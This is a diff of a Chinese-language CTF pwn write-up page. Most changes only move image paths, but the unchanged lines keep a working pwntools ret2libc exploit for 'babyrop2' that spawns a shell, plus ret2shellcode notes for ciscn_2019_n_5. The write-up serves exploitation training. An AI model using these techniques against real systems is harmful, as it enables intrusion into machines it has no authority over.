@@ -23,17 +23,17 @@
 <meta property="og:site_name" content="Isolator&#39;s Blog">
 <meta property="og:description" content="exp">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://isolator-1.github.io/img/ciscn_2019_n_5/1.jpg">
-<meta property="og:image" content="https://isolator-1.github.io/img/ciscn_2019_n_5/2.jpg">
-<meta property="og:image" content="https://isolator-1.github.io/img/ciscn_2019_n_5/3.jpg">
-<meta property="og:image" content="https://isolator-1.github.io/img/ciscn_2019_n_5/4.jpg">
+<meta property="og:image" content="https://isolator-1.github.io/img/ctf-pwn/ciscn_2019_n_5/1.jpg">
+<meta property="og:image" content="https://isolator-1.github.io/img/ctf-pwn/ciscn_2019_n_5/2.jpg">
+<meta property="og:image" content="https://isolator-1.github.io/img/ctf-pwn/ciscn_2019_n_5/3.jpg">
+<meta property="og:image" content="https://isolator-1.github.io/img/ctf-pwn/ciscn_2019_n_5/4.jpg">
 <meta property="article:published_time" content="2022-11-16T11:07:00.000Z">
-<meta property="article:modified_time" content="2023-12-04T06:43:51.423Z">
+<meta property="article:modified_time" content="2024-07-23T06:15:17.400Z">
 <meta property="article:author" content="Isolator">
 <meta property="article:tag" content="ctf-pwn">
 <meta property="article:tag" content="stack">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://isolator-1.github.io/img/ciscn_2019_n_5/1.jpg">
+<meta name="twitter:image" content="https://isolator-1.github.io/img/ctf-pwn/ciscn_2019_n_5/1.jpg">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
@@ -336,12 +336,12 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = process(&#x27;./babyrop2&#x27;)</span><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">29507</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./babyrop2&#x27;</span>)<br><br>poprdi_ret = <span class="hljs-number">0x400733</span><br>poprsi_popr15_ret = <span class="hljs-number">0x400731</span><br>main = elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>printf_plt = elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>printf_got = elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br><br>read_plt = elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>]<br>read_got = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br><br>format_str = <span class="hljs-number">0x400790</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">40</span> + p64(poprdi_ret) + p64(format_str) + \<br>          p64(poprsi_popr15_ret) + p64(read_got) + p64(<span class="hljs-number">0</span>) + p64(printf_plt) + p64(main)<br><br>p.sendlineafter(<span class="hljs-string">&quot;What&#x27;s your name? &quot;</span>,payload)<br><br>read_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;read_addr:&#x27;</span> + <span class="hljs-built_in">hex</span>(read_addr))<br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;read&#x27;</span>, read_addr)<br>offset = read_addr - libc.dump(<span class="hljs-string">&#x27;read&#x27;</span>)<br>binsh = offset + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>system = offset + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">40</span> + p64(poprdi_ret) + p64(binsh) + p64(system)<br><br>p.sendlineafter(<span class="hljs-string">&quot;What&#x27;s your name? &quot;</span>, payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
 
 <h3 id="题目6"><a href="#题目6" class="headerlink" title="题目6"></a>题目6</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#ciscn_2019_n_5">https://buuoj.cn/challenges#ciscn_2019_n_5</a></p>
-<p><img src="/img/ciscn_2019_n_5/1.jpg" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/ctf-pwn/ciscn_2019_n_5/1.jpg" srcset="/img/loading.gif" lazyload></p>
 <p>依旧是栈溢出，可以构造rop，也可以直接ret2shellcode（没开NX）</p>
 <p>由于rop写习惯了，先列出rop的做法</p>
-<p><img src="/img/ciscn_2019_n_5/2.jpg" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/ctf-pwn/ciscn_2019_n_5/2.jpg" srcset="/img/loading.gif" lazyload></p>
 <p>第一个输入随便写，第二个输入开始溢出</p>
-<p><img src="/img/ciscn_2019_n_5/3.jpg" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/ctf-pwn/ciscn_2019_n_5/3.jpg" srcset="/img/loading.gif" lazyload></p>
 <p>溢出30+2+8 = 40个字节，用puts的got表来泄露libc基址</p>
 <p>值得注意的是返回main后第二遍溢出时需要栈对齐</p>
 <p><strong>Exp1</strong></p>
@@ -350,7 +350,7 @@
 
 
 <p><strong>ret2shellcode</strong></p>
-<p><img src="/img/ciscn_2019_n_5/4.jpg" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/ctf-pwn/ciscn_2019_n_5/4.jpg" srcset="/img/loading.gif" lazyload></p>
 <p>由于题目给了bss段上100个字节的空间，可以用来写shellcode</p>
 <p>需要在注意的包括context.arch设置平台环境</p>
 <p>而且特意看了一下 <code>len(shellcode) </code>是 48 &lt; 100字节</p>
